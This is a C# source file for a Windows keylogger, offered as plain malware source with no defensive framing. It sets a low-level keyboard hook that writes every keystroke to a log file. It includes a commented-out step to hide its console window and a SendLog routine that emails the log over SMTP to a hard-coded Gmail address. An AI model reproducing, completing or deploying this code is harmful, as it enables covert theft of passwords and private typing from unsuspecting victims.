using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger
{
	internal class Program
	{
		const int SW_HIDE = 0;
		const int SW_SHOW = 5;
		private const int WH_KEYBOARD_LL = 13;
		private const int WM_KEYDOWN = 0x0100;
		private static readonly LowLevelKeyboardProc _proc = HookCallback;
		private static IntPtr _hookID = IntPtr.Zero;

		public static void Main()
		{
			var hWnd = GetConsoleWindow();
			// ShowWindow(hWnd, SW_HIDE); // hide console window
			// SendLog(); // for test
            _hookID = SetHook(_proc);
			Application.Run();
			UnhookWindowsHookEx(_hookID);
		}

		private static IntPtr SetHook(LowLevelKeyboardProc proc)
		{
			using (var curProcess = Process.GetCurrentProcess())
			using (var curModule = curProcess.MainModule)
			{
				return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
					GetModuleHandle(curModule.ModuleName), 0);
			}
		}

		private static IntPtr HookCallback(
			int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
			{
				var vkCode = Marshal.ReadInt32(lParam);

				using (var writer = new StreamWriter("keyLogger.log", true))
				{
					switch (vkCode)
					{
						case (int)Keys.Space:
							writer.WriteAsync(String.Format(" {0} ", ((Keys)vkCode)));
							break;
						case (int)Keys.Return:
							writer.WriteAsync(String.Format(" {0} ", ((Keys)vkCode)));
							break;
						default:
							writer.WriteAsync(((Keys)vkCode).ToString());
							break;
					}
				}
			}
			return CallNextHookEx(_hookID, nCode, wParam, lParam);
		}

		public static void SendLog()
		{
			// TODO: need normal smtp server
			using (var mail = new MailMessage
			{
				From = new MailAddress("***"), // from mail adress *@mail.com
				To =
				{
					"mazillko@gmail.com"
				},
				Subject = "Log",
				Body = "..."
			})
			{
				using (var smtpServer = new SmtpClient("***") // smtp server 
				{
					Port = 25,
					Credentials = new NetworkCredential("***", "***"), // user and password
					EnableSsl = true
					
			})
				{
					try
					{
						smtpServer.Send(mail);
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.Message);
					}
				}
			}
		}

		#region WinApi Functions
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
			private static extern IntPtr SetWindowsHookEx(int idHook,
				LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

			[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool UnhookWindowsHookEx(IntPtr hhk);

			[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
			private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
				IntPtr wParam, IntPtr lParam);

			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
			private static extern IntPtr GetModuleHandle(string lpModuleName);

			private delegate IntPtr LowLevelKeyboardProc(
				int nCode, IntPtr wParam, IntPtr lParam);

			[DllImport("kernel32.dll")]
			static extern IntPtr GetConsoleWindow();

			[DllImport("user32.dll")]
			static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		#endregion
	}
}